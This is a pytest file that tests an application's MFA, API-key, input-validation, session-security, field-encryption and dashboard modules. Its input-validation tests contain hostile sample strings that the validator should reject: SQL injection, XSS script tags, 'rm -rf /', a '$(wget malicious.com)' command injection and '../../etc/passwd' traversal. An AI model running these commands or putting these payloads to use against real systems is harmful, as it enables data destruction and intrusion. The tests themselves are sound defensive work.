"""
Phase 3 Security Tests
Comprehensive testing for MFA, API Keys, Input Validation, Session Security, and Field Encryption
"""

import pytest
import pyotp
import json
from datetime import datetime, timedelta
from unittest.mock import Mock, patch

# Import security modules
from app.core.mfa import mfa_manager
from app.core.api_key_manager import api_key_manager, APIKeyType
from app.core.input_validation import input_validator, ValidationError
from app.core.session_security import session_security_manager, SessionFingerprint
from app.core.field_encryption import field_encryption, secure_storage
from app.core.security_dashboard import security_dashboard


class TestMFAImplementation:
    """Test Multi-Factor Authentication functionality"""
    
    def test_generate_secret(self):
        """Test TOTP secret generation"""
        secret = mfa_manager.generate_secret()
        assert secret is not None
        assert len(secret) == 32  # Base32 encoded secret
        assert secret.isalnum()
    
    def test_generate_provisioning_uri(self):
        """Test QR code URI generation"""
        secret = "JBSWY3DPEHPK3PXP"
        email = "user@example.com"
        
        uri = mfa_manager.generate_provisioning_uri(email, secret)
        assert uri.startswith("otpauth://totp/")
        assert email in uri
        assert f"secret={secret}" in uri
    
    def test_verify_valid_token(self):
        """Test valid TOTP token verification"""
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret, algorithm="SHA256", digits=6, interval=30)
        current_token = totp.now()
        
        assert mfa_manager.verify_token(secret, current_token) is True
    
    def test_verify_invalid_token(self):
        """Test invalid TOTP token verification"""
        secret = pyotp.random_base32()
        
        assert mfa_manager.verify_token(secret, "000000") is False
        assert mfa_manager.verify_token(secret, "123456") is False
    
    def test_generate_backup_codes(self):
        """Test backup code generation"""
        codes = mfa_manager.generate_backup_codes()
        
        assert len(codes) == 10
        for code in codes:
            assert len(code) == 9  # Format: XXXX-XXXX
            assert code[4] == '-'
            assert code[:4].isalnum()
            assert code[5:].isalnum()
    
    def test_hash_backup_code(self):
        """Test backup code hashing"""
        code = "ABCD-1234"
        hashed = mfa_manager.hash_backup_code(code)
        
        assert hashed is not None
        assert len(hashed) == 64  # SHA256 hex digest
        assert hashed != code
    
    def test_verify_backup_code(self):
        """Test backup code verification"""
        code = "TEST-CODE"
        hashed = mfa_manager.hash_backup_code(code)
        hashed_codes = [hashed, "other_hash"]
        
        is_valid, matched_hash = mfa_manager.verify_backup_code(code, hashed_codes)
        assert is_valid is True
        assert matched_hash == hashed
        
        # Test invalid code
        is_valid, matched_hash = mfa_manager.verify_backup_code("WRONG-CODE", hashed_codes)
        assert is_valid is False
        assert matched_hash is None


class TestAPIKeyManagement:
    """Test API Key Management System"""
    
    def test_generate_api_key(self):
        """Test API key generation"""
        plain_key, hashed_key = api_key_manager.generate_api_key(APIKeyType.PRIVATE)
        
        assert plain_key.startswith("dk_")
        assert len(plain_key) > 30
        assert hashed_key != plain_key
        assert len(hashed_key) == 64  # SHA256 hex digest
    
    def test_generate_webhook_signature(self):
        """Test webhook signature generation"""
        payload = '{"event": "test"}'
        secret = "webhook_secret"
        
        signature = api_key_manager.generate_webhook_signature(payload, secret)
        
        assert signature.startswith("t=")
        assert ",v1=" in signature
    
    def test_verify_webhook_signature(self):
        """Test webhook signature verification"""
        payload = '{"event": "test"}'
        secret = "webhook_secret"
        
        signature = api_key_manager.generate_webhook_signature(payload, secret)
        
        # Valid signature
        assert api_key_manager.verify_webhook_signature(payload, signature, secret) is True
        
        # Invalid signature
        assert api_key_manager.verify_webhook_signature(payload, "invalid", secret) is False
        
        # Wrong secret
        assert api_key_manager.verify_webhook_signature(payload, signature, "wrong") is False
    
    def test_default_rate_limits(self):
        """Test default rate limits by key type"""
        assert api_key_manager.default_rate_limits[APIKeyType.PUBLIC] == 100
        assert api_key_manager.default_rate_limits[APIKeyType.PRIVATE] == 1000
        assert api_key_manager.default_rate_limits[APIKeyType.ADMIN] == 10000
        assert api_key_manager.default_rate_limits[APIKeyType.SERVICE] == 50000
        assert api_key_manager.default_rate_limits[APIKeyType.WEBHOOK] == 5000


class TestInputValidation:
    """Test Input Validation Framework"""
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        # Should detect SQL injection
        with pytest.raises(ValidationError) as exc_info:
            input_validator.validate_sql_injection("'; DROP TABLE users; --")
        assert "SQL injection detected" in str(exc_info.value)
        
        with pytest.raises(ValidationError) as exc_info:
            input_validator.validate_sql_injection("1' OR '1'='1")
        assert "SQL injection detected" in str(exc_info.value)
        
        # Should pass clean input
        clean_input = "normal user input"
        assert input_validator.validate_sql_injection(clean_input) == clean_input
    
    def test_xss_sanitization(self):
        """Test XSS attack prevention"""
        # Should sanitize script tags
        malicious = '<script>alert("XSS")</script>'
        sanitized = input_validator.validate_xss(malicious)
        assert "<script>" not in sanitized
        assert "alert" not in sanitized
        
        # Should escape HTML entities
        html_input = '<div onclick="alert()">Click me</div>'
        sanitized = input_validator.validate_xss(html_input)
        assert "&lt;" in sanitized
        assert "&gt;" in sanitized
    
    def test_command_injection_detection(self):
        """Test command injection detection"""
        # Should detect command injection
        with pytest.raises(ValidationError) as exc_info:
            input_validator.validate_command_injection("test; rm -rf /")
        assert "command injection detected" in str(exc_info.value)
        
        with pytest.raises(ValidationError) as exc_info:
            input_validator.validate_command_injection("$(wget malicious.com)")
        assert "command injection detected" in str(exc_info.value)
    
    def test_path_traversal_detection(self):
        """Test path traversal detection"""
        # Should detect path traversal
        with pytest.raises(ValidationError) as exc_info:
            input_validator.validate_path_traversal("../../etc/passwd")
        assert "Path traversal attempt detected" in str(exc_info.value)
        
        with pytest.raises(ValidationError) as exc_info:
            input_validator.validate_path_traversal("..\\windows\\system32")
        assert "Path traversal attempt detected" in str(exc_info.value)
    
    def test_email_validation(self):
        """Test email address validation"""
        # Valid emails
        assert input_validator.validate_email_address("user@example.com") == "user@example.com"
        assert input_validator.validate_email_address("test.user+tag@domain.co.uk")
        
        # Invalid emails
        with pytest.raises(ValidationError):
            input_validator.validate_email_address("invalid.email")
        with pytest.raises(ValidationError):
            input_validator.validate_email_address("@example.com")
    
    def test_url_validation(self):
        """Test URL validation"""
        # Valid URLs
        assert input_validator.validate_url("https://example.com") == "https://example.com"
        assert input_validator.validate_url("http://sub.domain.com/path?query=1")
        
        # Invalid URLs
        with pytest.raises(ValidationError):
            input_validator.validate_url("javascript:alert()")
        with pytest.raises(ValidationError):
            input_validator.validate_url("not-a-url")
    
    def test_sanitize_html(self):
        """Test HTML sanitization"""
        html = '<p>Safe content</p><script>alert("XSS")</script>'
        sanitized = input_validator.sanitize_html(html)
        
        assert "<p>" in sanitized
        assert "Safe content" in sanitized
        assert "<script>" not in sanitized
        assert "alert" not in sanitized


class TestSessionSecurity:
    """Test Session Security Enhancements"""
    
    def test_session_fingerprint_generation(self):
        """Test session fingerprint generation"""
        fingerprint = SessionFingerprint(
            user_agent="Mozilla/5.0",
            accept_language="en-US",
            accept_encoding="gzip, deflate",
            ip_address="192.168.1.1"
        )
        
        hash_value = fingerprint.generate_fingerprint()
        assert hash_value is not None
        assert len(hash_value) == 64  # SHA256 hex digest
    
    def test_risk_score_calculation(self):
        """Test session risk scoring"""
        fp1 = SessionFingerprint(
            user_agent="Mozilla/5.0",
            accept_language="en-US",
            accept_encoding="gzip",
            ip_address="192.168.1.1"
        )
        
        # Same fingerprint = low risk
        fp2 = SessionFingerprint(
            user_agent="Mozilla/5.0",
            accept_language="en-US",
            accept_encoding="gzip",
            ip_address="192.168.1.1"
        )
        assert fp2.get_risk_score(fp1) == 0.0
        
        # Different IP = higher risk
        fp3 = SessionFingerprint(
            user_agent="Mozilla/5.0",
            accept_language="en-US",
            accept_encoding="gzip",
            ip_address="10.0.0.1"
        )
        assert fp3.get_risk_score(fp1) > 0.3
        
        # Different browser = higher risk
        fp4 = SessionFingerprint(
            user_agent="Chrome/91.0",
            accept_language="en-US",
            accept_encoding="gzip",
            ip_address="192.168.1.1"
        )
        assert fp4.get_risk_score(fp1) > 0.3
    
    def test_geographic_anomaly_detection(self):
        """Test impossible travel detection"""
        # Locations too far apart for time elapsed
        is_anomaly = session_security_manager.detect_geographic_anomaly(
            40.7128, -74.0060,  # New York
            51.5074, -0.1278,   # London
            30  # 30 minutes
        )
        assert is_anomaly is True
        
        # Reasonable travel
        is_anomaly = session_security_manager.detect_geographic_anomaly(
            40.7128, -74.0060,  # New York
            40.7580, -73.9855,  # Manhattan
            30  # 30 minutes
        )
        assert is_anomaly is False


class TestFieldEncryption:
    """Test Field-Level Encryption"""
    
    def test_encrypt_decrypt_value(self):
        """Test value encryption and decryption"""
        original = "sensitive_data_123"
        
        encrypted = field_encryption.encrypt_value(original)
        assert encrypted != original
        assert isinstance(encrypted, str)
        
        decrypted = field_encryption.decrypt_value(encrypted)
        assert decrypted == original
    
    def test_encrypt_decrypt_dict(self):
        """Test dictionary field encryption"""
        data = {
            "name": "John Doe",
            "ssn": "123-45-6789",
            "credit_card": "4111111111111111",
            "email": "john@example.com"
        }
        
        # Encrypt sensitive fields
        encrypted_data = field_encryption.encrypt_dict(data)
        assert encrypted_data["name"] == "John Doe"  # Not encrypted
        assert encrypted_data["ssn"] != "123-45-6789"  # Encrypted
        assert encrypted_data["credit_card"] != "4111111111111111"  # Encrypted
        assert "__ssn_encrypted" in encrypted_data
        assert "__credit_card_encrypted" in encrypted_data
        
        # Decrypt
        decrypted_data = field_encryption.decrypt_dict(encrypted_data)
        assert decrypted_data["ssn"] == "123-45-6789"
        assert decrypted_data["credit_card"] == "4111111111111111"
        assert "__ssn_encrypted" not in decrypted_data
    
    def test_secure_storage(self):
        """Test secure storage wrapper"""
        data = {
            "username": "testuser",
            "api_secret": "super_secret_key",
            "access_token": "token_12345"
        }
        
        # Store with encryption
        storage_record = secure_storage.store_sensitive_data(
            data,
            storage_key="user_123"
        )
        
        assert storage_record["encrypted"] is True
        assert storage_record["data"]["api_secret"] != "super_secret_key"
        assert storage_record["data"]["access_token"] != "token_12345"
        
        # Retrieve and decrypt
        retrieved_data = secure_storage.retrieve_sensitive_data(storage_record)
        assert retrieved_data["api_secret"] == "super_secret_key"
        assert retrieved_data["access_token"] == "token_12345"


class TestSecurityDashboard:
    """Test Security Dashboard functionality"""
    
    @patch('app.core.security_dashboard.SecurityMetrics.calculate_auth_metrics')
    @patch('app.core.security_dashboard.SecurityMetrics.calculate_api_metrics')
    @patch('app.core.security_dashboard.SecurityMetrics.calculate_security_events')
    async def test_dashboard_data_generation(self, mock_security, mock_api, mock_auth):
        """Test security dashboard data aggregation"""
        # Mock return values
        mock_auth.return_value = {
            "total_attempts": 100,
            "successful_logins": 80,
            "failed_logins": 20,
            "success_rate": 80.0,
            "failure_rate": 20.0,
            "suspicious_ips": []
        }
        
        mock_api.return_value = {
            "total_requests": 1000,
            "unique_keys_used": 10,
            "active_keys": 15,
            "rate_limit_violations": 5
        }
        
        mock_security.return_value = {
            "total_events": 10,
            "threat_level": "low",
            "threat_score": 15,
            "critical_events": 0
        }
        
        # Generate dashboard data
        db_mock = Mock()
        dashboard_data = await security_dashboard.get_dashboard_data(db_mock, "24h")
        
        assert dashboard_data is not None
        assert "authentication" in dashboard_data
        assert "api_usage" in dashboard_data
        assert "security_events" in dashboard_data
        assert "alerts" in dashboard_data
    
    def test_alert_generation(self):
        """Test security alert generation"""
        auth_metrics = {
            "failure_rate": 35.0,  # High failure rate
            "suspicious_ips": [
                {"ip": "192.168.1.1", "failed_attempts": 10},
                {"ip": "10.0.0.1", "failed_attempts": 8},
                {"ip": "172.16.0.1", "failed_attempts": 6}
            ]
        }
        
        api_metrics = {
            "rate_limit_violations": 150  # High violations
        }
        
        security_events = {
            "threat_level": "critical",
            "threat_score": 85,
            "critical_events": 7
        }
        
        alerts = security_dashboard._generate_alerts(auth_metrics, api_metrics, security_events)
        
        assert len(alerts) > 0
        assert any(alert["type"] == "authentication" for alert in alerts)
        assert any(alert["type"] == "api" for alert in alerts)
        assert any(alert["type"] == "security" for alert in alerts)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])